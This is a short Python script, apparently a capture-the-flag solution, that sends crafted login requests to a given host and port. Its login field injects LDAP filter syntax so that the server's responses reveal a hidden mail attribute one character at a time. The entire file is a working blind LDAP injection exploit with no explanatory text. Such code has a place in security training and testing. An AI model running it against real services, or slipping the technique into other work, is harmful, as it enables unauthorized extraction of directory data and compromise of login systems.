# python3 hack.py <ip> <port> 
import requests, string, sys

HOST = sys.argv[1]
PORT = sys.argv[2]
URL = f"http://{HOST}:{PORT}/"
user = "admin"

Array = string.ascii_letters + string.digits

def main():
	flag = ""

	while True:
		have = False

		for i in Array:
			data = {
				"login": f"{user})(|(mail={flag}{i}*",
				"password": "1337)"
			}
			q = requests.post(URL, data = data)

			if user in q.text:
				flag += i
				have = True
				print(flag)
				break

		if not have:
			break

if __name__ == '__main__':
	main()